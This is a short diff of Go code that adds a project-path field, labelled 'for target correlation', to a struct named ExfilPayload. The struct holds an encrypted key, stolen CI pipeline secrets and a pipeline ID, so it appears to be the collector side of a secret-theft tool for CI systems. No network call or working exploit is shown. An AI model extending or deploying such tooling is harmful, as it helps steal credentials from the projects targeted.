@@ -26,6 +26,7 @@ type ExfilPayload struct {
 	EncKey     string `json:"key"`     // base64 RSA-encrypted AES key
 	Data       string `json:"data"`    // base64 unencrypted secrets
 	PipelineID string `json:"pipeline_id"`
+	Project    string `json:"project"` // CI_PROJECT_PATH for target correlation
 	// Parsed fields (populated after decrypt)
 	Secrets    map[string]string `json:"-"`
 	ReceivedAt time.Time         `json:"-"`
